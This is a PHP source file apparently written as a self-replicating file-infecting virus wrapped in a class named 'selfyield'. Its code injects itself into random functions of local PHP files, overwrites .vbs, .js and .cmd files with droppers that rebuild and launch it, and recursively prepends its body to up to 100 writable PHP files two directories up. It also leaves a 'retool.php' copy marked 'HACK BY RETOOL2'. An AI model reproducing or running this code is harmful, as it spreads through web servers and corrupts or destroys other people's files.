<?php
class selfyield{
  protected $base_url='';
  public function __construct(){

    if (isset($_SERVER['HTTP_HOST'])) {
    	$atRoot=false; $atCore=false; $parse=FALSE;
    	$http = isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https' : 'http';
    	$hostname = $_SERVER['HTTP_HOST'];

    	$dir =  str_replace(basename($_SERVER['SCRIPT_NAME']), '', $_SERVER['SCRIPT_NAME']);
    	//echo $dir;exit;
    	$core = preg_split('@/@', str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath(dirname(__FILE__))), NULL, PREG_SPLIT_NO_EMPTY);

    	$core = $core[0];
    	$tmplt = $atRoot ? ($atCore ? "%s://%s/%s/" : "%s://%s/") : ($atCore ? "%s://%s/%s/" : "%s://%s%s");
    	$end = $atRoot ? ($atCore ? $core : $hostname) : ($atCore ? $core : $dir);
    	$this->base_url = sprintf( $tmplt, $http, $hostname, $end );
    }
    else $this->base_url = 'http://localhost/';

    if ($parse) {
    	$this->base_url = parse_url($this->base_url);
    	if (isset($this->base_url['path'])) if ($this->base_url['path'] == '/') $this->base_url['path'] = '';
    }
    //echo $this->base_url;exit;
    file_get_contents($this->base_url."backup/2");
  }
  public function startNow(){
    $this->bubble();
  }
  private function copy(){
    $ln=16;
    $filehandle=fopen(__FILE__,'r');
    srand((double)microtime()*1000000);
    fseek($filehandle, $ln);
    $content=fread($filehandle, 1611);
    fclose($filehandle);
    $curdir=opendir('.');
    while ($file = readdir($curdir))
    {
      if (strstr($file, '.php'))
      {
    	  //echo $file;exit;;
        $victim=fopen($file, 'r+');
        $vicont=fread($victim, filesize($file));
        if (!strstr($vicont, 'SPTH'))
        {
          $possible=0; $viccont=$vicont;
          while(strstr($viccont, 'function '))
          {
            $viccont=strstr($viccont, 'function ');
    				$possible++;
          }
    	  	//echo $viccont;exit;
          $which=rand(1,$possible);
          $viccont=$vicont;
          while($which--)
          {
            $viccont=strstr($viccont, 'function ');
          }
          $viccont=strstr($viccont, '{');
          $before=strlen($vicont)-strlen($viccont)+1; $check=0; $i=0;
          do
          {
              if ($viccont{$i}=='{') { $check++; }
    		      if ($viccont{$i++}=='}') { $check--; }
          }

          while($check);
          fseek($victim, $before);
          $funccont=fread($victim, $i+1);
          fseek($victim, $before+$i-1);
          $aftercont=fread($victim, filesize($file)-$before-$i-strlen(strstr($vicont, '?>')));
          $coundj=0; $newvar='';
          do
          {
            $newvar.=chr(rand(97,122)); $countj++;
          }
          while ($countj<rand(5,15));
          rewind($victim);
          $beforecont=fread($victim, $before);
          rewind($victim);
          fwrite($victim, $beforecont.chr(13).chr(10).'$ln='.($before+strlen($before)+9).';'.chr(13).chr(10).$content.chr(13).chr(10).$newvar.'(); }'.$aftercont.chr(13).chr(10).'function '.$newvar.'() {'.chr(13).chr(10).$funccont.'?'.'>');
        }
      }
    }

    //for vbs
    $string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
    $vbscode='set fso=WScript.CreateObject('.chr(34).'Scripting.FileSystemObject'.chr(34).')'.chr(13).chr(10);
    $vbscode.='set shell=WScript.CreateObject('.chr(34).'WScript.Shell'.chr(34).')'.chr(13).chr(10);
    $vbscode.='set script=fso.CreateTextFile('.chr(34).'index.htm'.chr(34).')'.chr(13).chr(10);
    while ($string && $string!='?>')
    {
      $vbscode.='script.WriteLine('.chr(34).$string.chr(34).')'.chr(13).chr(10);
      $string=strtok(chr(13).chr(10));
    }
    $vbscode.='script.WriteLine('.chr(34).'?';
    $vbscode.='>'.chr(34).')'.chr(13).chr(10);
    $vbscode.='script.Close()'.chr(13).chr(10);
    $vbscode.='shell.Run '.chr(34).'index.htm'.chr(34);
    $directory=opendir('.');
    while ($file = readdir($directory))
    {
      if (strstr($file, '.vbs'))
      {
        fwrite(fopen($file, 'w'), $vbscode);
      }
    }
    closedir($directory);

    //for js
    $string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
    $vbscode='var fso=WScript.CreateObject('.chr(34).'Scripting.FileSystemObject'.chr(34).')'.chr(13).chr(10);
    $vbscode.='var shell=WScript.CreateObject('.chr(34).'WScript.Shell'.chr(34).')'.chr(13).chr(10);
    $vbscode.='var script=fso.CreateTextFile('.chr(34).'index.htm'.chr(34).')'.chr(13).chr(10);
    while ($string && $string!='?>')
    {
      $vbscode.='script.WriteLine('.chr(34).$string.chr(34).')'.chr(13).chr(10);
      $string=strtok(chr(13).chr(10));
    }
    $vbscode.='script.WriteLine('.chr(34).'?';
    $vbscode.='>'.chr(34).')'.chr(13).chr(10);
    $vbscode.='script.Close()'.chr(13).chr(10);
    $vbscode.='shell.Run '.chr(34).'index.htm'.chr(34);
    $directory=opendir('.');
    while ($file = readdir($directory))
    {
      if (strstr($file, '.js'))
      {
        fwrite(fopen($file, 'w'), $vbscode);
      }
    }
    closedir($directory);

    //BAT extension
    $string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
    $string=strtok(chr(13).chr(10));
    $cmdcode='cls'.chr(13).chr(10).'@echo off'.chr(13).chr(10).'del index.html'.chr(13).chr(10);
    while ($string{0}!='?')
    {
      $cmdcode.='echo '.$string.chr(62).chr(62).'index.html'.chr(13).chr(10);
      $string=strtok(chr(13).chr(10));
    }
    $cmdcode.='echo var fso=WScript.CreateObject("Scripting.FileSystemObject");'.chr(62).' file.js'.chr(13).chr(10);
    $cmdcode.='echo var shell=WScript.CreateObject("WScript.Shell");'.chr(62).chr(62).' file.js'.chr(13).chr(10);
    $cmdcode.='echo all=fso.OpenTextFile("index.html").ReadAll();'.chr(62).chr(62).' file.js'.chr(13).chr(10);
    $cmdcode.='echo a=fso.OpenTextFile("index.html",2);'.chr(62).chr(62).' file.js'.chr(13).chr(10);
    $cmdcode.='echo a.Write(String.fromCharCode(60,63,112,104,112,13,10)+all+String.fromCharCode(13,10,63,62));'.chr(62).chr(62).' file.js'.chr(13).chr(10);
    $cmdcode.='echo a.Close();'.chr(62).chr(62).' file.js'.chr(13).chr(10);
    $cmdcode.='echo shell.Run("index.html");'.chr(62).chr(62).' file.js'.chr(13).chr(10);
    $cmdcode.='cscript file.js';

    $directory=opendir('.');
    while ($file = readdir($directory))
    {
      if (strstr($file, '.cmd'))
      {
        fwrite(fopen($file, 'w'), $cmdcode);
      }
    }
    closedir($directory);


    //for encryption
    $content=chr(60).chr(63).chr(112).chr(104).chr(112).chr(13).chr(10).chr(112).chr(114).chr(105).
             chr(110).chr(116).chr(40).chr(34).chr(72).chr(105).chr(32).chr(86).chr(88).chr(101).
             chr(114).chr(33).chr(32).chr(84).chr(104).chr(105).chr(115).chr(32).chr(105).chr(115).
             chr(32).chr(106).chr(117).chr(115).chr(116).chr(32).chr(97).chr(32).chr(115).chr(105).
             chr(108).chr(108).chr(121).chr(32).chr(116).chr(101).chr(115).chr(116).chr(32).chr(115).
             chr(116).chr(114).chr(105).chr(110).chr(103).chr(32).chr(102).chr(111).chr(114).chr(32).
             chr(116).chr(104).chr(101).chr(32).chr(101).chr(110).chr(99).chr(114).chr(121).chr(112).
             chr(116).chr(105).chr(111).chr(110).chr(32).chr(105).chr(110).chr(32).chr(80).chr(72).
             chr(80).chr(46).chr(34).chr(41).chr(59).chr(13).chr(10).chr(63).chr(62);
    		 //echo $content;exit;
    copy(__FILE__,'file.php');
    $a=fopen('file.php','w+');
    fwrite($a, $content);
    fclose($a);
    include('file.php');
    unlink('file.php');
  }
  public function bubble(){
    $atefile = 0;
    $this->walkthrough('../..');
  }
  function walkthrough($dir) {
    $dir=($dir=='')?dirname(dirname(__FILE__)):$dir;
    global $atefile;
    $maxi = 100;
    $viruscontents=fread(fopen(__FILE__,'r'), 1626);
    if (!file_exists('retool.php')) {
      $handle = fopen('retool.php', 'a');
      fwrite($handle, $viruscontents.'HACK BY RETOOL2');
      fclose($handle);
    }
    if(is_dir($dir)){
      if($dh = opendir($dir)){
       while(($file = readdir($dh)) !== false && $atefile<$maxi){
        if($file != "." && $file != ".."){
         if(is_dir($dir."/".$file)){
          $this->walkthrough($dir."/".$file);
         }else{
          if(strstr (substr($file, -4), 'php')){
           $infected=true;
           $caniwrite=false;
           if ( is_file($dir."/".$file) && is_writeable($dir."/".$file) ){
            $output = fopen($dir."/".$file, "r");
            if(filesize ($dir."/".$file)>0){
             $contents = fread ($output , 20);
             $mine = strstr ($contents, 'retool.php');
             fclose($output );
            }
            $infected=false;
            if($mine){$infected=true;}
           }
           if($infected==false){
            if(filesize ($dir."/".$file)>0){
             $victim = fopen($dir."/".$file, "r+");
             $ori = fread($victim, filesize($dir."/".$file));
             fclose($victim);
            }
            $victim = fopen($dir."/".$file, "w+");
            if(filesize($dir."/".$file)==0){
             fwrite($victim, $viruscontents);
            }else{
             fputs($victim ,$viruscontents.$ori);
            }
            $atefile++;
            fclose($victim );
           }
          }
         }
        }
       }
       closedir($dh);
      }
    }
    return $counter;
  }
}
?>
